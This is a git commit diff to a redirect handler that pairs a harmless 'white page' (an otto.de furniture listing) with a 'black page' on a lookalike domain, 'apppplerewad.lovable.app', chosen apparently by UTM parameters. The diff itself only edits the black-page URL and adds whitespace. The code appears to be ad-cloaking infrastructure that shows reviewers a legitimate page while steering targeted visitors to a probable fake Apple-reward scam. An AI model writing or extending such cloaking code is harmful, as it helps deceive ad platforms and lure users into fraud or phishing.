1ec45a9599afc103dd744d5a9f3d121b5d6c0371
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-11-03 18:40:53 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.otto.de/p/aiyaplay-kindersessel-kindersofa-mit-weicher-teddyfleece-baerenform-kindersessel-1-st-kinderstuhl-fuer-wohnzimmer-schlafzimmer-beige-S0RBN037/";
-    const blackPageURL = "https://apppplerewad.lovable.app/?";
+    const blackPageURL = "https://apppplerewad.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
